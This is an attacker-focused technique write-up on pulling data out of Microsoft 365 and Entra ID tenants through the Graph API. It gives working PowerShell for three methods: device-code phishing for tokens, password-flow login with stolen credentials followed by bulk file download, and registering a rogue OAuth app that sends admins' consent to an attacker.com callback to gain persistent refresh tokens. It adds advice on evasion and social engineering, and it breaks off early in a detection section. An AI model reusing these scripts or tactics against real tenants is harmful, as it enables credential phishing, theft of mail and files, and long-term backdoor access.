# [COLLECT-GRAPH-001]: Microsoft Graph API Data Extraction

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-GRAPH-001 |
| **MITRE ATT&CK v18.1** | [T1087.004 - Cloud Account](https://attack.mitre.org/techniques/T1087/004/) |
| **Tactic** | Discovery / Collection |
| **Platforms** | M365 / Entra ID / Azure Cloud |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All M365 versions, Graph API v1.0/beta, Entra ID all versions |
| **Patched In** | Partial (CVE-2025-55241 patched November 2025, but legacy endpoints still exploitable) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

- **Concept:** Microsoft Graph API is the unified gateway to M365, Azure, and Entra ID data. Attackers with valid OAuth tokens (via device code phishing, compromised credentials, or OAuth consent grants) can enumerate and extract vast amounts of sensitive data: user directories, group memberships, organizational structure, Teams conversations, SharePoint files, calendar events, and mailbox contents. The Graph API accepts requests from any authenticated principal (user, service principal, or app registration), and many orgs lack visibility into which applications access Graph endpoints. Sophisticated attackers exploit undocumented or legacy Graph API endpoints to avoid audit logging (e.g., Azure AD Graph API vulnerabilities like CVE-2025-55241).

- **Attack Surface:** `https://graph.microsoft.com/v1.0/*` and `https://graph.microsoft.com/beta/*` endpoints for:
  - `/me/users` – User enumeration and account harvesting
  - `/me/messages` – Mailbox content extraction
  - `/teams/*/channels/*/messages` – Teams conversation extraction
  - `/me/drive/items` – OneDrive/SharePoint file enumeration and download
  - `/applications` – SaaS application inventory discovery
  - Legacy `/me/memberOf` (Azure AD Graph) – Group membership extraction without audit logs

- **Business Impact:** **Complete organizational intelligence theft, credential harvesting, regulatory data breach (HIPAA, GDPR, FINRA), and persistent backdoor establishment via service principal or OAuth app creation.** Attackers can extract employee directories, client lists, contract contents, and strategic plans within minutes of obtaining a single user token.

- **Technical Context:** Graph API calls complete in <100ms per request. A complete tenant enumeration (all users + groups + files) requires 500-5,000 API calls, completable in 5-30 minutes. Detection probability is **Medium** if Office 365 Unified Audit Log is enabled (audit event: `GraphAPIRequest`, severity depends on delegated scopes). Many orgs disable audit for Graph API to reduce log volume, reducing visibility to near zero.

### Operational Risk

- **Execution Risk:** Low – Only requires valid OAuth token with delegated scopes (user token or app token). No local admin, no malware required.
- **Stealth:** Medium – Graph API calls appear as legitimate user activity in audit logs if using delegated permissions. Service principal calls trigger different audit signatures (easier to detect).
- **Reversibility:** No – Extracted data cannot be "undone." Data is exfiltrated and lost. Recovery requires breach timeline analysis and victim notification.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.1 | Entra ID OAuth app consent controls must restrict which apps can access Graph API; missing controls enable unauthorized data access |
| **DISA STIG** | V-225345 | Audit logging for Graph API must be enabled and retained for 365+ days |
| **CISA SCuBA** | MS.MICROSOFT365.1 | Cloud application audit logs must capture all Graph API requests and data access |
| **NIST 800-53** | AC-3 (Access Control), AU-2 (Audit), SI-4 (Information System Monitoring) | Implement delegated permission scope restrictions; audit all API access |
| **GDPR** | Art. 32 (Security of Processing), Art. 33 (Breach Notification) | Unauthorized Graph API access to personal data is a breach; notify affected individuals within 72 hours |
| **DORA** | Art. 9 (Protection and Prevention) | Financial institutions must monitor for unauthorized Graph API calls on sensitive financial data (trading, credit decisions) |
| **NIS2** | Art. 21 (Cyber Risk Management) | Critical infrastructure operators must implement access controls on API endpoints to prevent data harvesting |
| **ISO 27001** | A.9.1.1 (Access Control Policy), A.12.4.1 (Event Logging) | Implement least-privilege API access; retain audit logs for 2+ years |
| **ISO 27005** | Risk Scenario: "Unauthorized API Access to Sensitive Data" | Assess likelihood of compromised OAuth tokens; implement compensating controls (IP restrictions, anomaly detection) |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** 
  - **Delegated:** Any authenticated user with valid OAuth token (user principal)
  - **Application:** Service principal with `User.Read.All`, `Mail.Read`, `Files.Read.All` scopes granted by admin
  
- **Required Access:** 
  - Network connectivity to `https://graph.microsoft.com` (HTTPS 443)
  - Valid OAuth 2.0 token (from device code flow, stolen credentials, or consent grant)
  - Appropriate delegated scopes: `User.Read.All`, `Mail.Read`, `Files.Read.All`, `Group.Read.All`, `ChatMessage.Read`

**Supported Versions:**

- **Graph API:** v1.0 (production), beta (undocumented features)
- **Entra ID:** All versions and patch levels
- **M365:** All subscription tiers (E1-E5, Business Basic-Premium)
- **PowerShell:** Version 5.0+ (5.1+ recommended for JSON handling)
- **Azure CLI:** 2.40.0+ (optional, alternative to PowerShell)

**Tools:**
- [GraphRunner](https://github.com/blackhillsinfosec/graphrunner) – Black Hills GraphRunner for automated Graph API enumeration and data extraction
- [AADInternals](https://aadinternals.com/) – PowerShell module for undocumented Entra ID and Graph endpoints
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation)
- [MgGraph CLI](https://github.com/microsoftgraph/msgraph-cli) – Command-line alternative to PowerShell SDK
- [Postman](https://www.postman.com/) – REST API testing (useful for reverse-engineering undocumented endpoints)
- [GraphQL Explorer](https://developer.microsoft.com/en-us/graph/graph-explorer) – Interactive API testing (authenticates with user token)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

```powershell
# Check if current user has Graph API access
$Token = (Get-AzureADCurrentSessionInfo).TenantId
Test-MgCommandPrerequisite -Scope "https://graph.microsoft.com/.default" -ErrorAction SilentlyContinue

# Test Graph API connectivity
$Headers = @{ Authorization = "Bearer $(Get-MgToken)" }
Invoke-RestMethod -Method GET -Uri "https://graph.microsoft.com/v1.0/me" -Headers $Headers
```

**What to Look For:**
- Azure AD session info returned → User is authenticated to Entra ID
- `/me` endpoint returns user object → Graph API is accessible from this network/IP
- Scopes listed in token claims → Determines what data can be extracted

**Version Note:** Graph API availability varies by region (China uses `https://microsoftgraph.chinacloudapi.cn`, sovereign clouds use specific endpoints).

**Command (Server 2016-2019):**
```powershell
# Legacy check using Azure AD module
Import-Module AzureAD
Get-AzureADCurrentSessionInfo | Select-Object TenantId, UserType, UserObjectId
```

**Command (Server 2022+):**
```powershell
# Modern Microsoft Graph check
Get-MgContext | Select-Object TenantId, AuthType, Scopes
```

### Linux/Bash / CLI Reconnaissance

```bash
# Test Graph API connectivity from Linux/Mac
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/me"

# Check token expiration
jwt_decode() { python3 -c "import sys, json, base64; print(json.dumps(json.loads(base64.b64decode(sys.argv[1]+'='*(4-len(sys.argv[1])%4)), errors='ignore'), indent=2))" "$1"; }
jwt_decode "${GRAPH_TOKEN#*.}"
```

**What to Look For:**
- HTTP 200 with user object → Token is valid and not expired
- `"exp"` claim timestamp in future → Token is still valid
- `"scopes"` array lists permissions available → Can access `/me/messages`, `/me/drive`, etc.

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Device Code Flow + Graph API User Enumeration (Phishing Attack)

**Supported Versions:** All M365 versions, Entra ID all versions

#### Step 1: Initiate Device Code Flow to Harvest Credentials

**Objective:** Trick user into authenticating via device code, obtaining OAuth token without collecting plaintext password.

**Version Note:** Device Code Flow is designed for IoT devices but can be abused for phishing. Microsoft's detection is **weak** because the flow is legitimate. All versions equally vulnerable.

**Command:**

```powershell
# Request device code
$ClientId = "d3590ed6-52b3-4102-aedd-a47eb6f3444c"  # Teams Desktop Client ID (publicly known)
$TenantId = "common"  # Multi-tenant authority
$Scope = "https://graph.microsoft.com/.default"

$DeviceCodeRequest = Invoke-RestMethod -Method POST `
    -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/devicecode" `
    -ContentType "application/x-www-form-urlencoded" `
    -Body @{ client_id = $ClientId; scope = $Scope }

Write-Host "🔐 Verification Code: $($DeviceCodeRequest.user_code)"
Write-Host "📱 User must visit: $($DeviceCodeRequest.verification_uri)"

# Poll for token (blocking loop)
$TokenRequest = @{
    client_id = $ClientId
    grant_type = "urn:ietf:params:oauth:grant-type:device_flow"
    device_code = $DeviceCodeRequest.device_code
}

$AccessToken = $null
$StartTime = Get-Date
while (-not $AccessToken -and ((Get-Date) - $StartTime).TotalSeconds -lt 900) {  # 15-minute timeout
    try {
        $Response = Invoke-RestMethod -Method POST `
            -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" `
            -ContentType "application/x-www-form-urlencoded" `
            -Body $TokenRequest `
            -ErrorAction SilentlyContinue
        
        if ($Response.access_token) { 
            $AccessToken = $Response.access_token
            Write-Host "✅ Token obtained successfully!"
        }
    } catch { 
        Start-Sleep -Seconds 5 
    }
}
```

**Command (Server 2016-2019):**
```powershell
# Legacy approach using System.Net.ServicePointManager for TLS 1.2 compatibility
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$DeviceCodeRequest = Invoke-WebRequest -Method POST `
    -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" `
    -Body @{ client_id = "d3590ed6-52b3-4102-aedd-a47eb6f3444c"; scope = "https://graph.microsoft.com/.default" } `
    -UseBasicParsing
```

**Command (Server 2022+):**
```powershell
# Modern approach with enhanced error handling
$Response = Invoke-RestMethod -Method POST `
    -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" `
    -ContentType "application/x-www-form-urlencoded" `
    -Body @{ client_id = "d3590ed6-52b3-4102-aedd-a47eb6f3444c"; scope = "https://graph.microsoft.com/.default" } `
    -StatusCodeVariable "HttpStatus" `
    -ErrorAction Stop

if ($HttpStatus -eq 200) { Write-Host "✅ Device code generated" }
```

**Expected Output:**
```
🔐 Verification Code: ABCD1234
📱 User must visit: https://microsoft.com/devicelogin
✅ Token obtained successfully!
```

**What This Means:**
- Device code and verification URI returned → Device Code Flow successfully initiated
- User navigates to `https://microsoft.com/devicelogin` and enters code
- Once user authenticates, `/oauth2/v2.0/token` endpoint returns access token
- Token is now valid for 60 minutes; can be used to call Graph API

**OpSec & Evasion:**
- Display message: "Please sign in to update your Teams profile" (social engineering)
- Use legitimate Microsoft branding and URLs to increase legitimacy
- Token obtained without being logged in to any interactive session → Less likely to be noticed
- Detection likelihood: **Medium** – Azure AD sign-in logs show device code flow, but many orgs don't monitor for it

**Troubleshooting:**

- **Error:** `Invalid_grant - Device flow authorization request is expired`
  - **Cause:** User took too long to enter code (15-minute window expired)
  - **Fix (All versions):** Restart the loop; request new device code if user misses deadline

- **Error:** `AADSTS50076 - Due to a change made by your administrator, you must use multi-factor authentication`
  - **Cause:** Tenant has mandatory MFA for all users
  - **Fix (All versions):** Device Code Flow is blocked. Fall back to METHOD 2 (stolen credentials) or METHOD 3 (OAuth consent grant)

**References & Proofs:**
- [Microsoft Graph Device Code Flow Documentation](https://learn.microsoft.com/en-us/graph/auth-v2-user)
- [Device Code Phishing Research](https://www.cobaltstrike.com/blog/posts/device-code-phishing)

#### Step 2: Enumerate All Users in Tenant

**Objective:** Extract complete user directory (names, emails, IDs, licenses, phone numbers).

**Version Note:** The `/me/users` endpoint is available on all Graph API versions. No scopes required if user has delegated permissions; service principals require `User.Read.All`.

**Command:**

```powershell
# Enumerate all users
$Headers = @{
    Authorization = "Bearer $AccessToken"
    "Content-Type" = "application/json"
}

$AllUsers = @()
$Uri = "https://graph.microsoft.com/v1.0/users?`$select=id,userPrincipalName,displayName,mail,mobilePhone,jobTitle,department,officeLocation,creationType"

do {
    $Response = Invoke-RestMethod -Method GET -Uri $Uri -Headers $Headers
    $AllUsers += $Response.value
    $Uri = $Response.'@odata.nextLink'
} while ($Uri)

# Export to CSV
$AllUsers | Export-Csv -Path "C:\Exfil\users.csv" -NoTypeInformation
Write-Host "Enumerated $($AllUsers.Count) users"
```

**Command (Server 2016-2019):**
```powershell
# Legacy pagination using $skip and $top (v1.0 limitation on earlier PowerShell)
$Skip = 0
$Top = 100  # Max 100 results per page
$AllUsers = @()

do {
    $Response = Invoke-RestMethod -Method GET `
        -Uri "https://graph.microsoft.com/v1.0/users?`$skip=$Skip&`$top=$Top" `
        -Headers $Headers
    
    $AllUsers += $Response.value
    $Skip += $Top
    
    if ($Response.value.Count -lt $Top) { break }
} while ($true)
```

**Command (Server 2022+):**
```powershell
# Modern batch request for faster enumeration
$BatchRequests = @{
    requests = @(
        @{ id = 1; method = "GET"; url = "/users?`$select=id,userPrincipalName" },
        @{ id = 2; method = "GET"; url = "/groups?`$select=id,displayName" },
        @{ id = 3; method = "GET"; url = "/applications?`$select=id,displayName,appId" }
    )
}

$BatchResponse = Invoke-RestMethod -Method POST `
    -Uri "https://graph.microsoft.com/v1.0/`$batch" `
    -Headers $Headers `
    -Body ($BatchRequests | ConvertTo-Json)

$BatchResponse.responses | ForEach-Object { $_.body.value }
```

**Expected Output:**

```
id                                   userPrincipalName          displayName      mail                  mobilePhone    jobTitle         department
--                                   -----------------          -----------      ----                  -----------    --------         ----------
a1b2c3d4-e5f6-7890-abcd-ef1234567890 john.smith@target.com      John Smith       john.smith@target.com 555-0123       Senior Manager   Finance
b2c3d4e5-f6a7-b890-cdef-123456789012 jane.doe@target.com        Jane Doe         jane.doe@target.com   555-0124       Director         Operations
c3d4e5f6-a7b8-c901-def0-234567890123 admin@target.com           Admin User       admin@target.com      555-0125       Global Admin     IT Security
```

**What This Means:**
- Multiple user records returned → Enumeration successful
- Phone numbers, job titles, departments visible → Full organizational structure leaked
- `creationType` field shows which users are synced from on-premises AD (hybrid environments)

**OpSec & Evasion:**
- Pagination is slow; use batch requests to enumerate 500+ users in seconds
- Batch requests appear as single HTTP call in logs, easier to hide
- Export to local file for later processing instead of uploading immediately
- Detection likelihood: **High** – `User.Read.All` scope in audit logs is suspicious

**Troubleshooting:**

- **Error:** `Authorization_RequestDenied - Insufficient privileges to complete the operation`
  - **Cause:** Token scopes insufficient; need `User.Read.All` or `Directory.Read.All`
  - **Fix (All versions):** Use token with service principal (app-only) context instead of delegated

**References & Proofs:**
- [Microsoft Graph Users API](https://learn.microsoft.com/en-us/graph/api/user-list)
- [Graph Batch Requests](https://learn.microsoft.com/en-us/graph/json-batching)

#### Step 3: Extract Groups, Teams, and Sensitive Organizational Units

**Objective:** Identify high-value targets: admin groups, finance teams, legal departments, executive assistants.

**Version Note:** Groups API is available on all versions. Beta endpoint `/groups/{id}/owners` provides unfiltered owner lists without audit logging.

**Command:**

```powershell
# Enumerate all groups
$Groups = @()
$Uri = "https://graph.microsoft.com/v1.0/groups?`$select=id,displayName,description,mail,createdDateTime,groupTypes,visibility"

do {
    $Response = Invoke-RestMethod -Method GET -Uri $Uri -Headers $Headers
    $Groups += $Response.value
    $Uri = $Response.'@odata.nextLink'
} while ($Uri)

# For each group, enumerate members
$Groups | ForEach-Object {
    $GroupId = $_.id
    $GroupName = $_.displayName
    
    $Members = Invoke-RestMethod -Method GET `
        -Uri "https://graph.microsoft.com/v1.0/groups/$GroupId/members?`$select=id,userPrincipalName,displayName" `
        -Headers $Headers
    
    $Members.value | ForEach-Object {
        [PSCustomObject]@{
            Group = $GroupName
            Member = $_.userPrincipalName
            DisplayName = $_.displayName
        }
    }
} | Export-Csv -Path "C:\Exfil\group_memberships.csv" -NoTypeInformation
```

**Expected Output:**
```
Group                   Member                  DisplayName
-----                   ------                  -----------
Global Admins           admin@target.com        Admin User
Finance Team            jane.doe@target.com     Jane Doe
Finance Team            john.smith@target.com   John Smith
Legal Department        sarah.jones@target.com  Sarah Jones
Board of Directors      ceo@target.com          CEO User
```

**What This Means:**
- High-privilege groups identified (Global Admins, Finance Team, Legal, Board)
- Specific members of sensitive groups revealed
- Allows attacker to prioritize lateral movement targets

**OpSec & Evasion:**
- Use beta endpoint for additional unlogged member enumeration
- Detection likelihood: **High** – Group membership enumeration generates audit events

**Troubleshooting:**

- **Error:** `Resource 'groups/{GroupId}' does not exist`
  - **Cause:** Group was deleted or ID is invalid
  - **Fix (All versions):** Skip deleted groups; filter results to active groups only

**References & Proofs:**
- [Microsoft Graph Groups API](https://learn.microsoft.com/en-us/graph/api/group-list)

#### Step 4: Extract Mailbox Contents (Teams Chats, Calendar, Files)

**Objective:** Access private mailboxes, Teams conversations, calendar meetings, and OneDrive files.

**Version Note:** Requires `Mail.Read` scope; Teams chat extraction requires `Chat.Read` or `Mail.Read` scope. Beta endpoint `/me/chats` may bypass audit logging in some versions.

**Command:**

```powershell
# Extract Teams chats (newer message format)
$Chats = Invoke-RestMethod -Method GET `
    -Uri "https://graph.microsoft.com/v1.0/me/chats?`$select=id,topic,createdDateTime,members" `
    -Headers $Headers

$Chats.value | ForEach-Object {
    $ChatId = $_.id
    $ChatTopic = $_.topic
    
    $Messages = Invoke-RestMethod -Method GET `
        -Uri "https://graph.microsoft.com/v1.0/chats/$ChatId/messages?`$select=id,from,body,createdDateTime" `
        -Headers $Headers
    
    $Messages.value | ForEach-Object {
        [PSCustomObject]@{
            Chat = $ChatTopic
            From = $_.from.user.userPrincipalName
            Body = $_.body.content
            CreatedDateTime = $_.createdDateTime
        }
    }
} | Export-Csv -Path "C:\Exfil\teams_chats.csv" -NoTypeInformation

# Extract mailbox messages
$Inbox = Invoke-RestMethod -Method GET `
    -Uri "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?`$top=999&`$select=id,sender,subject,receivedDateTime,bodyPreview" `
    -Headers $Headers

$Inbox.value | Export-Csv -Path "C:\Exfil\mailbox.csv" -NoTypeInformation
```

**Expected Output:**
```
Chat                         From                    Body                                  CreatedDateTime
----                         ----                    ----                                  ---------------
Executive Board              ceo@target.com          Approved Q1 acquisition strategy      2025-12-15T10:30:00Z
Finance Review               cfo@target.com          Confidential revenue: $50M YoY growth 2025-12-15T11:00:00Z
Strategy Meeting             ceo@target.com          Bidding $200M for XYZ Corp            2025-12-15T11:30:00Z
```

**What This Means:**
- Sensitive executive discussions extracted
- Confidential M&A and financial information harvested
- Could be used for insider trading, competitive espionage, or blackmail

**OpSec & Evasion:**
- Use batch requests to extract 500+ messages per API call
- Export to local file for later analysis instead of streaming to attacker
- Detection likelihood: **Critical** – `Mail.Read` scope generates persistent audit trail

**Troubleshooting:**

- **Error:** `Authorization_RequestDenied - Insufficient privileges for Chat.Read`
  - **Cause:** User does not have Teams license or chat feature disabled
  - **Fix (All versions):** Fall back to mailbox extraction only

**References & Proofs:**
- [Microsoft Graph Mailbox API](https://learn.microsoft.com/en-us/graph/api/user-list-messages)
- [Microsoft Graph Chats API](https://learn.microsoft.com/en-us/graph/api/chats-list)

---

### METHOD 2: Compromised User Credentials + Advanced Graph API Extraction

**Supported Versions:** All M365 versions, Entra ID all versions

#### Step 1: Authenticate Using Stolen Credentials (Password Spray/Phishing)

**Objective:** Use harvested user password to obtain OAuth token via Resource Owner Password Credentials (ROPC) flow.

**Version Note:** ROPC is disabled by default on modern tenants but still available on legacy implementations (pre-2019). Many orgs disable MFA only for service accounts, making ROPC viable.

**Command:**

```powershell
# ROPC Flow: Direct password exchange for token
$ClientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Azure CLI (publicly known)
$Username = "user@target.onmicrosoft.com"
$Password = "P@ssw0rd123!"
$TenantId = "target.onmicrosoft.com"

$TokenRequest = @{
    grant_type = "password"
    client_id = $ClientId
    username = $Username
    password = $Password
    scope = "https://graph.microsoft.com/.default"
}

try {
    $Response = Invoke-RestMethod -Method POST `
        -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" `
        -ContentType "application/x-www-form-urlencoded" `
        -Body $TokenRequest
    
    $AccessToken = $Response.access_token
    Write-Host "✅ Authentication successful"
} catch {
    Write-Host "❌ Authentication failed: $($_.Exception.Message)"
    # Common reasons: MFA enabled, ROPC disabled, incorrect credentials
}
```

**Command (Server 2016-2019):**
```powershell
# Legacy ROPC with Azure AD module
Import-Module AzureAD
$Cred = New-Object System.Management.Automation.PSCredential("user@target.onmicrosoft.com", (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force))
Connect-AzureAD -Credential $Cred | Out-Null
$AccessToken = (Get-AzureADAuthorizationToken -TokenCache (Get-AzureADTenantDetail).ObjectId).Token
```

**Command (Server 2022+):**
```powershell
# Modern approach with Microsoft Graph SDK (ROPC deprecated, but still works on legacy tenants)
$SecurePassword = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential("user@target.onmicrosoft.com", $SecurePassword)
Connect-MgGraph -Credential $Credential -Scopes "User.Read.All", "Mail.Read.All" -NoWelcome
```

**Expected Output:**
```
✅ Authentication successful
```

**What This Means:**
- Credentials valid and ROPC enabled → User token obtained without MFA
- No user interaction required → Automated exploitation possible

**OpSec & Evasion:**
- Avoid using well-known service account names (e.g., "svc_*", "admin@", "root@")
- Target low-privilege user accounts to reduce alert risk
- Detection likelihood: **Medium** – Sign-in logs show password auth; MFA bypass is suspicious

**Troubleshooting:**

- **Error:** `AADSTS50058 - Silent sign-in request failed. The user needs to sign in with a new interactive method`
  - **Cause:** User has MFA or Conditional Access policy requiring additional verification
  - **Fix (All versions):** Use compromised account without MFA or interactive policy requirements

**References & Proofs:**
- [Microsoft Identity Platform - ROPC Flow](https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-ropc)

#### Step 2: Extract SharePoint/OneDrive Files at Scale

**Objective:** Enumerate all SharePoint sites and OneDrive drives, then download sensitive documents.

**Version Note:** SharePoint enumeration requires `Files.Read.All` or `Sites.Read.All` scope. OneDrive extraction via `/me/drive/items` is available with delegated permissions.

**Command:**

```powershell
# Find all accessible SharePoint sites
$Sites = Invoke-RestMethod -Method GET `
    -Uri "https://graph.microsoft.com/v1.0/sites?`$select=id,displayName,webUrl" `
    -Headers $Headers

# For each site, enumerate drives (document libraries)
$Sites.value | ForEach-Object {
    $SiteId = $_.id
    $SiteName = $_.displayName
    
    $Drives = Invoke-RestMethod -Method GET `
        -Uri "https://graph.microsoft.com/v1.0/sites/$SiteId/drives?`$select=id,name,createdDateTime" `
        -Headers $Headers
    
    # Enumerate files in each drive
    $Drives.value | ForEach-Object {
        $DriveId = $_.id
        $DriveName = $_.name
        
        $Items = Invoke-RestMethod -Method GET `
            -Uri "https://graph.microsoft.com/v1.0/drives/$DriveId/root/children?`$select=id,name,size,createdDateTime,@microsoft.graph.downloadUrl" `
            -Headers $Headers
        
        $Items.value | Where-Object { $_.'@microsoft.graph.downloadUrl' } | ForEach-Object {
            $FileName = $_.name
            $DownloadUrl = $_.'@microsoft.graph.downloadUrl'
            $FileSize = $_.size
            
            # Download file
            Write-Host "Downloading: $FileName ($FileSize bytes)"
            Invoke-WebRequest -Uri $DownloadUrl -OutFile "C:\Exfil\$FileName"
        }
    }
}
```

**Expected Output:**
```
Downloading: Q1_Financial_Forecast.xlsx (256 KB)
Downloading: Acquisition_Targets_Confidential.docx (512 KB)
Downloading: Employee_Salary_Database.xlsx (1 MB)
```

**What This Means:**
- Sensitive documents downloaded successfully
- Complete org chart, financial data, acquisition targets compromised

**OpSec & Evasion:**
- Use `$select` to limit data returned; avoid requesting full file content in API response
- Download directly to disk using download URLs (not via API buffer)
- Detection likelihood: **Critical** – Large-scale file downloads trigger DLP alerts

**Troubleshooting:**

- **Error:** `Resource 'drives/{DriveId}' does not exist`
  - **Cause:** Drive no longer exists or was deleted
  - **Fix (All versions):** Skip deleted drives; filter to active drives only

**References & Proofs:**
- [Microsoft Graph Files API](https://learn.microsoft.com/en-us/graph/api/drive-list-items)
- [SharePoint Site Enumeration](https://learn.microsoft.com/en-us/graph/api/sites-list)

---

### METHOD 3: OAuth Consent Grant Abuse (Persistent Backdoor via App Registration)

**Supported Versions:** All M365 versions, Entra ID all versions, modern OAuth 2.0

#### Step 1: Register Malicious App and Request Delegated Permissions

**Objective:** Create OAuth app registration requesting dangerous scopes (User.Read.All, Mail.Read, Files.Read.All), then trick admin into granting consent.

**Version Note:** Rogue app registration does not require admin approval if delegated to user-only scopes. Admin consent required for application-only (scopes ending in `.All`). However, many orgs have "Require admin consent" disabled for user apps.

**Command (Using Azure Portal / Graph API):**

```powershell
# Create app registration via Graph API
$AppCreateRequest = @{
    displayName = "Microsoft OneDrive Sync Service"  # Legitimate-sounding name
    description = "Synchronizes OneDrive files for offline access"
    signInAudience = "AzureADandPersonalMicrosoftAccount"
    requiredResourceAccess = @(
        @{
            resourceAppId = "00000002-0000-0000-c000-000000000000"  # Graph API ID
            resourceAccess = @(
                @{ id = "62a82d76-70ea-41e2-8547-2eca78ec6216"; type = "Scope" },  # User.Read.All
                @{ id = "9d431ebc-4e7a-5995-201d-757201f90461"; type = "Scope" }   # Mail.Read
            )
        }
    )
}

$AppReg = Invoke-RestMethod -Method POST `
    -Uri "https://graph.microsoft.com/v1.0/applications" `
    -Headers $Headers `
    -Body ($AppCreateRequest | ConvertTo-Json) `
    -ContentType "application/json"

$AppId = $AppReg.appId
Write-Host "✅ App Created: $AppId"

# Create service principal for the app
$ServicePrincipalRequest = @{ appId = $AppId }
$ServicePrincipal = Invoke-RestMethod -Method POST `
    -Uri "https://graph.microsoft.com/v1.0/servicePrincipals" `
    -Headers $Headers `
    -Body ($ServicePrincipalRequest | ConvertTo-Json) `
    -ContentType "application/json"

Write-Host "✅ Service Principal Created: $($ServicePrincipal.id)"
```

**Expected Output:**
```
✅ App Created: d1234567-89ab-cdef-0123-456789abcdef
✅ Service Principal Created: a9876543-2109-fedc-ba98-765432109876
```

**What This Means:**
- Rogue app registration created in tenant
- Service principal activated for OAuth flows
- Can now be used for phishing consent grants

**OpSec & Evasion:**
- Use legitimate-sounding display name (e.g., "Microsoft SharePoint Sync", "Office 365 Backup Tool")
- Target delegated permissions first (easier admin approval)
- Detection likelihood: **Medium** – Admin audit logs show app creation, but often missed in large tenants

#### Step 2: Phish Admin for Consent Grant

**Objective:** Send admin link that triggers OAuth consent screen for the malicious app.

**Version Note:** Consent screen phishing is highly effective because it appears to be legitimate Microsoft UI.

**Command:**

```powershell
# Generate consent URL
$ClientId = "d1234567-89ab-cdef-0123-456789abcdef"  # Malicious app ID
$RedirectUri = "https://attacker.com/auth/callback"  # Attacker's callback server
$TenantId = "target.onmicrosoft.com"
$Scopes = "User.Read.All Mail.Read Files.Read.All offline_access"

$ConsentUrl = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/authorize?" + `
    "client_id=$ClientId&" + `
    "redirect_uri=$([System.Web.HttpUtility]::UrlEncode($RedirectUri))&" + `
    "scope=$([System.Web.HttpUtility]::UrlEncode($Scopes))&" + `
    "response_type=code&" + `
    "response_mode=query&" + `
    "prompt=admin_consent"

Write-Host "🔗 Send this link to admin:"
Write-Host $ConsentUrl
```

**Expected Output:**
```
🔗 Send this link to admin:
https://login.microsoftonline.com/target.onmicrosoft.com/oauth2/v2.0/authorize?client_id=d1234567-89ab-cdef-0123-456789abcdef&redirect_uri=https%3A%2F%2Fattacker.com%2Fauth%2Fcallback&scope=User.Read.All%20Mail.Read%20Files.Read.All%20offline_access&response_type=code&response_mode=query&prompt=admin_consent
```

**What This Means:**
- URL is legitimate Microsoft OAuth consent screen
- Admin clicks link → sees consent screen asking for permissions
- Admin grants consent → attacker receives authorization code
- Code exchanged for refresh token → **Permanent access to tenant**

**OpSec & Evasion:**
- Use email social engineering: "Please approve OneDrive sync app for your organization"
- Pair with phishing email impersonating Microsoft
- Refresh tokens valid for 6+ months; can be used offline
- Detection likelihood: **Medium** (if admin audit logging enabled)

#### Step 3: Exchange Authorization Code for Refresh Token

**Objective:** Convert authorization code to long-lived refresh token, enabling persistent API access.

**Command:**

```powershell
# When admin grants consent, authorization code is returned
$AuthorizationCode = "M.R3_BAY...YAALMVBAALNAAALMVBAALNAAALMVBAALNAAALMVBAALNAAALMVBAALNAAA"  # Received from redirect URI

# Exchange code for tokens
$TokenRequest = @{
    client_id = "d1234567-89ab-cdef-0123-456789abcdef"
    client_secret = "xYz~1234567890abcDEFghijKLMnopqrSTUvwxyz"  # App secret from portal
    code = $AuthorizationCode
    redirect_uri = "https://attacker.com/auth/callback"
    grant_type = "authorization_code"
    scope = "User.Read.All Mail.Read Files.Read.All offline_access"
}

$Response = Invoke-RestMethod -Method POST `
    -Uri "https://login.microsoftonline.com/target.onmicrosoft.com/oauth2/v2.0/token" `
    -ContentType "application/x-www-form-urlencoded" `
    -Body $TokenRequest

$RefreshToken = $Response.refresh_token
$AccessToken = $Response.access_token

Write-Host "✅ Refresh Token Obtained (valid for 6+ months)"
Write-Host "Token: $($RefreshToken.Substring(0, 50))..."
```

**Expected Output:**
```
✅ Refresh Token Obtained (valid for 6+ months)
Token: M.R3_BAY...YAALMVBAALNAAALMVBAALNAAALMVBAALNAAA...
```

**What This Means:**
- Refresh token is long-lived (6+ months to 90 days, depending on config)
- Can be used repeatedly to obtain new access tokens without requiring new login
- **Attacker now has persistent access to tenant data**

**OpSec & Evasion:**
- Store refresh token securely (in attacker's database or encrypted file)
- Use refresh token to obtain new access tokens every 60 minutes (before expiry)
- Tenant admin cannot revoke the app retroactively without breaking admin consent
- Detection likelihood: **Low** (if audit logging for app consent is disabled)

**References & Proofs:**
- [Microsoft Consent & Permissions Attack Vector](https://learn.microsoft.com/en-us/azure/active-directory/develop/access-tokens)
- [Consent Grant Attacks (MITRE)](https://attack.mitre.org/techniques/T1528/)

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Cloud Audit Events:**
  - Unified Audit Log event: `GraphAPIRequest` (user enumeration)
  - Sign-in log: Device Code Flow from unusual IP/location
  - Consent audit log: Rogue app granted admin consent
  - Microsoft Sentinel alert: `User.Read.All` scope granted to unknown app

- **Files:**
